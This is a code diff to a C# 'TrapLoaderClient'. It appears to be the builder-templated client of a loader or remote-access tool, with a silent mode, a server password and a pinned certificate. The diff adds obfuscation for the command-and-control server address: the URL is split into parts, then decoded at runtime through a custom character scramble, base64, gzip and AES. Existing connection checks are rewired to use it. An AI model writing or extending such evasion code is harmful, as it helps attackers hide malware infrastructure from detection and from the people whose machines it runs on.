@@ -3,6 +3,7 @@ using System.Collections.Concurrent;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
+using System.IO.Compression;
 using System.Linq;
 using System.Net.Security;
 using System.Net.Sockets;
@@ -17,11 +18,57 @@ using System.Threading.Tasks;
 
 public class TrapLoaderClient
 {
-    // Configuration (replaced by builder)
-    private static string serverUrl = "{{SERVER_URL}}";
+    // Configuration — obfuscated URL parts (replaced by builder)
+    private static string _urlPart1 = "{{URL_PART1}}";
+    private static string _urlPart2 = "{{URL_PART2}}";
+    private static string _urlPart3 = "{{URL_PART3}}";
+    private static byte[] _urlKey = new byte[] { {{AES_KEY}} };
+    private static byte[] _urlIv = new byte[] { {{AES_IV}} };
     private static string serverCertBase64 = "{{CERTIFICATE}}";
     private static bool silentMode = {{SILENT_MODE}};
     private static string serverPassword = "{{PASSWORD}}";
+
+    private static string _serverUrl;
+    private static string GetServerUrl()
+    {
+        if (_serverUrl != null) return _serverUrl;
+        var full = Descramble(_urlPart1 + _urlPart2 + _urlPart3);
+        var compressed = Convert.FromBase64String(full);
+        using (var msIn = new MemoryStream(compressed))
+        using (var gzip = new GZipStream(msIn, CompressionMode.Decompress))
+        using (var msOut = new MemoryStream())
+        {
+            gzip.CopyTo(msOut);
+            var ciphertext = msOut.ToArray();
+            using (var aes = Aes.Create())
+            {
+                aes.Key = _urlKey; aes.IV = _urlIv;
+                using (var decryptor = aes.CreateDecryptor())
+                using (var ms = new MemoryStream(ciphertext))
+                using (var cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
+                using (var sr = new StreamReader(cs))
+                {
+                    return _serverUrl = sr.ReadToEnd();
+                }
+            }
+        }
+    }
+
+    private static string Descramble(string s)
+    {
+        var sb = new StringBuilder(s.Length);
+        foreach (char c in s)
+        {
+            if (c >= 'A' && c <= 'Z') sb.Append((char)((c - 'A' + 13) % 26 + 'A'));
+            else if (c >= 'a' && c <= 'z') sb.Append((char)((c - 'a' + 13) % 26 + 'a'));
+            else if (c >= '0' && c <= '9') sb.Append((char)((c - '0' + 5) % 10 + '0'));
+            else if (c == '!') sb.Append('+');
+            else if (c == '?') sb.Append('/');
+            else if (c == '*') sb.Append('=');
+            else sb.Append(c);
+        }
+        return sb.ToString();
+    }
 
     // Message types
     private const byte MSG_AUTH = 0x01;
@@ -398,14 +445,14 @@ public class TrapLoaderClient
             Log(" Silent mode: " + silentMode);
             Log("========================================");
 
-            if (serverUrl.Contains("{{"))
+            if (GetServerUrl().Contains("{{"))
             {
                 Log("FATAL: Configuration placeholders were not replaced by the builder!");
                 WaitAndExit(1);
                 return 1;
             }
 
-            if (string.IsNullOrWhiteSpace(serverUrl))
+            if (string.IsNullOrWhiteSpace(GetServerUrl()))
             {
                 Log("FATAL: Server URL is empty!");
                 WaitAndExit(1);
@@ -535,7 +582,7 @@ public class TrapLoaderClient
             systemInfo = "Unknown|Unknown|Unknown|Unknown|Unknown|Unknown";
         }
 
-        var parsed = ParseServerAddress(serverUrl);
+        var parsed = ParseServerAddress(GetServerUrl());
         string sHost = parsed.Item1;
         int sPort = parsed.Item2;
 
@@ -543,7 +590,7 @@ public class TrapLoaderClient
 
         if (string.IsNullOrWhiteSpace(sHost))
         {
-            Log("FATAL: Could not parse server address from: [" + serverUrl + "]");
+            Log("FATAL: Could not parse server address from: [" + GetServerUrl() + "]");
             WaitAndExit(1);
             return;
         }
